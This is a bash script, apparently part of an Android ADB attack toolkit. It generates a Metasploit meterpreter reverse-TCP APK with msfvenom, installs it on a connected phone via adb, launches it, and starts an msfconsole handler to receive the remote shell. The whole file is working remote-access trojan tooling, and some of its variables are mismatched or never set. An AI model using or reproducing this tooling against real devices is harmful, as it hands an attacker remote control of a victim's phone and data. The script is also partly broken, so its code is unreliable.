#!/usr/bin/env bash

if ! which msfvenom >/dev/null; then
    echo -e "'\e[1;93mMetasploit Framework\e[0m' not found please install it first then run the script"
    exit
fi

#Total device count setting to zero initially
total_dev=0

## DEVICE ID & MODEL EXTARCT ##
dev=$(bash modules/HelperFunctions/GetDevices)

if [ "$dev" != "" ]; then
    total_dev=${#dev[@]}
fi

clear
echo -e "\n\e[1;93m
 ______               __                 __      ______                    __
|   __ \.---.-.--.--.|  |.-----.---.-.--|  |    |      |.----.-----.---.-.|  |_.-----.----.
|    __/|  _  |  |  ||  ||  _  |  _  |  _  |    |   ---||   _|  -__|  _  ||   _|  _  |   _|
|___|   |___._|___  ||__||_____|___._|_____|    |______||__| |_____|___._||____|_____|__|
              |_____|
\e[0m"

lhost_taker() {

    read -rp $'\n\n\e[1;91mEnter the IP address ( LHOST )\e[0m\e[1;93m : ' lhost1
    if [ "$lhost" == "" ]; then
        echo -e "\e[91mPlease enter the IP address plz....\n"
        lhost_taker
    fi

}

lport_taker() {

    read -rp $'\n\n\e[1;91mEnter the PORT number ( LPORT )\e[0m\e[1;93m : ' lport1
    if [ "$lport" == "" ]; then
        echo -e "\e[91mPlease enter the PORT number plz....\n"
        lport_taker
    fi

}

name_taker() {

    read -rp $'\n\n\e[1;91mEnter the name of Payload .apk file\e[0m\e[1;93m : ' name_apk
    if [ "$name_apk" == "" ]; then
        echo -e "\e[91mNo name was entered so taking name as update.apk....\n"
        time=$(date +"%T")
        name_apk="update-$time"
    fi
}

payload_creator() {

    echo -e "\n\e[1;5;92mGENERATING PAYLOAD WAIT A MOMENT.\e[0m" && msfvenom -p android/meterpreter/reverse_tcp LHOST="$lhost" LPORT="$lport" R >"metasploit/$name_apk.apk" 2>/dev/null
    echo -e "\n\e[1;93mThe payload was saved inside $PWD/metasploit/$name_apk.apk\e[0m"
    to_install=0
}

apk_install() {

    echo -e "\e[1;92mINSTALLING THE PAYLOAD\n"
    adb -s $devv install -r metasploit/$name_apk.apk
    if [ "$?" == "0" ]; then
        echo -e "\n\e[1;92mSuccessfully installed the 'apk' into device $modd\n"
    else
        echo -e "\n\e[1;91mFailed installing the 'apk' into device $modd\n"
    fi
}

start_listner() {

    adb -s $devv shell monkey -p com.metasploit.stage -c android.intent.category.LAUNCHER 1 >/dev/null 2>&1 | echo -e "\e[1;93mLaunching the PAYLOAD.\e[0m"
    echo -e "\n\e[1;92mDone\n"
    echo -e "\e[1;92mStarting the MSF listner\n"
    time=$(date +"%T")
    echo -e "use exploit/multi/handler\nset PAYLOAD android/meterpreter/reverse_tcp\nset LHOST $lhost1\nset LPORT $lport1\nexploit" >$PWD/metasploit/.exploit-$time.rc
    msfconsole -q -r $PWD/metasploit/.exploit-$time.rc

}

dev_payload_create() {

    devcode=$1
    modelname=$2
    lhost_taker
    lport_taker
    name_taker
    payload_creator
    while true; do
        read -rp $'\e[93;1mDo you want to install the PAYLOAD in the device.\e[1;97m (y/N) \e[91;1m? : \e[1;93m' yn
        case $yn in
        [Yy]*)
            apk_install "$devcode" "$modelname"
            break
            ;;
        *)
            clear
            bash modules/function2.sh
            break
            ;;
        esac
    done
    while true; do
        read -rp $'\e[93;1mDo you want to start the MSF listner.\e[1;97m (y/N) \e[91;1m? : \e[1;93m' yn
        case $yn in
        [Yy]*)
            start_listner
            break
            ;;
        *)
            clear
            bash modules/function2.sh
            break
            ;;
        esac
    done
}

if [ "$total_dev" == "0" ]; then
    echo -e "\e[91;1mNO DEVICE CONNECTED"
else

    if [ "$total_dev" == "1" ]; then

        devcode=$(echo "${dev[0]}" | awk '{print $1}')
        modelname=$(echo "${dev[0]}" | awk '{print $2}')
        echo -e "\e[93m1. \e[92m $devcode, \e[93mModel : \e[92m$modelname"
        dev_payload_create "$devcode" "$modelname"
    else

        echo -e "\e[93mSelect the device :- \e[92m\n"
        for ((i = 0; i < total_dev; i++)); do
            devcode=$(echo "${dev[$i]}" | awk '{print $1}')
            modelname=$(echo "${dev[$i]}" | awk '{print $2}')
            echo -e "\e[93m1. \e[92m $devcode, \e[93mModel : \e[92m$modelname "
        done

        while true; do

            read -rp $'\n\e[1;4;91mEnter here\e[0m\e[24;1;97m : ' options
            [[ $options =~ ^[0-9]+$ ]] || {
                echo -e "\e[93m\nEnter a valid number"
                continue
            }
            if ((options >= 1 && options <= total_dev)); then
                devcode=$(echo "${dev[$options - 1]}" | awk '{print $1}')
                modelname=$(echo "${dev[$options - 1]}" | awk '{print $2}')
                dev_payload_create "$devcode" "$modelname"
                break
            else
                echo -e "\e[93m\nEnter a valid number"
            fi

        done

    fi
fi

## Asking to Clear the screen
bash modules/HelperFunctions/AskClear
